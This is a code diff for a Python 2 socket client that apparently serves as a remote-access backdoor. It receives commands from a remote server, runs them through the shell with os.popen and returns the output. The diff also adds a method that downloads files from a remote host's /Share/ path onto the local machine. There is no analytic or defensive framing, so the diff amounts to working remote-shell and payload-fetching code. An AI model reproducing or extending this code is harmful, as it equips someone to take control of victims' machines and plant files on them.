@@ -40,7 +40,7 @@ TODO:
 #1 Learn how to change the stdout of a subprocess.Popen object, return it, and send it down the wire.
 #2. Add more of the features into the program.
 '''
-import socket, subprocess, sys
+import socket, subprocess, sys, httplib, os
 
 class Client():
 	'''
@@ -81,19 +81,35 @@ class Client():
 		while(True):
 			cmd = self.RecvData(sock)
 			results = self.RunCommand(cmd)
-			#f = file('output.txt','r')
+			
 			self.SendData(sock,results)
 	
 	'''
 	This Method runs the commands that come from the Server.
 	'''		
 	def RunCommand(self,cmd):
-		f = open("output.txt",'w')
-		subprocess.Popen(cmd,self.DATASIZE,None,0,f,0, shell=True)
-		f.close()
-		return f
 		
-
+		results = os.popen(cmd)
+		
+		return results.read()
+		
+	def DownloadFile(self,url,file_list):
+		
+		files = []
+		files.append(file_list)
+		
+		conn = httplib.HTTPConnection(url)
+		
+		for f in files:
+			conn.request('GET','/Share/%s' % f)
+			response = conn.getresponse()
+			data = response.read()
+			with open(f, 'wb') as downloadedFile:
+				downloadedFile.write(data)
+				
+		conn.close()
+			
+		
 		
 
 def main(args):
